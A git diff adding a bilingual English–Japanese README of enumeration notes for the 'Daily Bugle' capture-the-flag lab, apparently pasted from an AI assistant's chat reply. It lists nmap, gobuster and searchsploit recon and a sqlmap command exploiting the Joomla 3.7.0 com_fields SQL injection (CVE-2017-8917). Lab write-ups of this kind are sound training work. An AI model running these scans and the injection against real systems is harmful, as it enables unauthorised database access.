@@ -214,3 +214,239 @@ SQL
 
 
 ## SQLmap
+
+了解、和志。  
+GitHub の README を **日本語版 + 英語版の二言語構成**でまとめ直したよ。  
+そのままコピペで README.md に使えるようにしてある。
+
+---
+
+# 📰 Daily Bugle CTF – Enumeration Report  
+（**English + 日本語**）
+
+---
+
+# 🇺🇸 **English Version**
+
+## 📌 Overview
+This repository contains my enumeration notes and findings during the **Daily Bugle CTF** challenge.  
+The target host exposed a Joomla-based web application, which led to identifying a known SQL injection vulnerability in Joomla 3.7.0.
+
+---
+
+## 🔎 1. Nmap Scan
+
+### Command
+```bash
+nmap --min-rate 5000 -T4 10.49.190.46
+```
+
+### Results
+| Port | State | Service |
+|------|--------|----------|
+| 22/tcp | open | ssh |
+| 80/tcp | open | http |
+| 3306/tcp | open | mysql |
+
+---
+
+## 📂 2. Directory Enumeration (Gobuster)
+
+### Command
+```bash
+gobuster dir -u http://10.49.190.46 -w /usr/share/wordlists/dirb/common.txt
+```
+
+### Key Findings
+- `/administrator` (Joomla admin panel)
+- `/components`
+- `/modules`
+- `/plugins`
+- `/templates`
+- `/robots.txt`
+- `/index.php` (200 OK)
+
+---
+
+## 🔐 3. Joomla Administrator Panel
+Accessing:
+
+```
+http://10.49.190.46/administrator
+```
+
+Displayed the Joomla login page.
+
+---
+
+## 🤖 4. robots.txt Investigation
+
+```
+http://10.49.190.46/robots.txt
+```
+
+Contains Joomla default disallow rules:
+
+```
+Disallow: /administrator/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /libraries/
+```
+
+---
+
+## 🔐 5. SSH Algorithm Enumeration
+
+### Command
+```bash
+nmap -p22 --script ssh2-enum-algos 10.49.190.46
+```
+
+SSH supports modern algorithms.  
+Web exploitation is prioritized.
+
+---
+
+## 🧩 6. Joomla Version Identification (Searchsploit)
+
+### Command
+```bash
+searchsploit joomla 3.7.
+```
+
+### Relevant Vulnerability
+- **Joomla! 3.7.0 – com_fields SQL Injection (CVE-2017-8917)**  
+  Path: `php/webapps/42033.txt`
+
+### PoC Example
+```bash
+sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
+--risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+```
+
+### ✔ Answer to the CTF question  
+**Joomla version = 3.7.0**
+
+---
+
+## 🏁 Conclusion
+- Target runs Joomla CMS  
+- Directory enumeration confirmed typical Joomla structure  
+- robots.txt reinforced Joomla presence  
+- Searchsploit revealed **Joomla 3.7.0** with a known SQLi vulnerability  
+
+---
+
+# 🇯🇵 **日本語版**
+
+## 📌 概要
+このリポジトリは、**Daily Bugle CTF** における初期調査（Enumeration）の結果をまとめたものです。  
+ターゲットホストは Joomla ベースの Web アプリケーションを公開しており、調査の結果 **Joomla 3.7.0 の既知 SQL インジェクション脆弱性** を特定しました。
+
+---
+
+## 🔎 1. Nmap スキャン
+
+### コマンド
+```bash
+nmap --min-rate 5000 -T4 10.49.190.46
+```
+
+### 結果
+| ポート | 状態 | サービス |
+|--------|--------|-----------|
+| 22/tcp | open | SSH |
+| 80/tcp | open | HTTP |
+| 3306/tcp | open | MySQL |
+
+---
+
+## 📂 2. ディレクトリ列挙（Gobuster）
+
+### コマンド
+```bash
+gobuster dir -u http://10.49.190.46 -w /usr/share/wordlists/dirb/common.txt
+```
+
+### 主な発見
+- `/administrator`（Joomla 管理画面）
+- `/components`
+- `/modules`
+- `/plugins`
+- `/templates`
+- `/robots.txt`
+- `/index.php`（200 OK）
+
+---
+
+## 🔐 3. Joomla 管理画面
+アクセス：
+
+```
+http://10.49.190.46/administrator
+```
+
+Joomla のログイン画面が表示された。
+
+---
+
+## 🤖 4. robots.txt の調査
+
+```
+http://10.49.190.46/robots.txt
+```
+
+Joomla デフォルトの Disallow 設定が記載されていた：
+
+```
+Disallow: /administrator/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /libraries/
+```
+
+---
+
+## 🔐 5. SSH アルゴリズム列挙
+
+### コマンド
+```bash
+nmap -p22 --script ssh2-enum-algos 10.49.190.46
+```
+
+SSH は安全な暗号スイートを使用しており、  
+Web 側の攻撃を優先する判断となった。
+
+---
+
+## 🧩 6. Joomla バージョン特定（Searchsploit）
+
+### コマンド
+```bash
+searchsploit joomla 3.7.
+```
+
+### 関連脆弱性
+- **Joomla! 3.7.0 – com_fields SQL Injection（CVE-2017-8917）**
+
+### PoC（抜粋）
+```bash
+sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
+--risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+```
+
+### ✔ CTF の設問回答  
+**Joomla のバージョン：3.7.0**
+
+---
+
+## 🏁 まとめ
+- ターゲットは Joomla CMS を使用  
+- ディレクトリ列挙で Joomla 構造を確認  
+- robots.txt で Joomla であることを裏付け  
+- Searchsploit により **Joomla 3.7.0 の SQLi 脆弱性** を特定  
+
+---
+
+必要なら README の最後に **攻撃フロー図** や **後半（SQLmap → Shell → PrivEsc → Flag）** も追加できるよ。
